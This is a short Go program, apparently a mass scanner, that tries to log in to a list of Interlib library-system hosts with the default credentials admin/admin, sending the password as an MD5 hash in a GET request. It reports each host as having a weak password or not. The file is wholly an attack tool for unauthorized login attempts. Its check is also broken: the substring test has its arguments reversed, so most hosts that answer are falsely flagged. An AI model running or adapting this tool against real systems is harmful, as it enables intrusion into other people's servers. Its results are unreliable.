package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

func main()  {
	files, err := os.Open("interlib.txt")
	if err != nil {
		fmt.Println("字典打开失败，请检查当前目录下是否存在字典interlib.txt文件")
		return
	}
	defer files.Close()
	i := bufio.NewScanner(files)
	for i.Scan(){
		client := &http.Client{}
		s2 := "/interlib/common/Login?cmdACT=opLOGIN&loginid=admin&askm=21232f297a57a5a743894a0e4a801fc3&furl=maxMain.jsp"
		var payload = fmt.Sprintf("http://%s%s", i.Text(), s2)
		re, err := http.NewRequest("GET", payload, nil)
		if err != nil {
			fmt.Printf("无法访问 %s\n", i.Text())
		}
		re1 , _ := client.Do(re)
		defer re1.Body.Close()
		body, _ := ioutil.ReadAll(re1.Body)
		jieguo := strings.Contains("登录失败!!!", string(body))
		if jieguo == false && re1.StatusCode == 200 {
			fmt.Printf("%s存在弱口令(账号admin，密码admin)\n", i.Text())
		}else {
			fmt.Printf("%s不存在弱口令\n", i.Text())
		}
	}
}
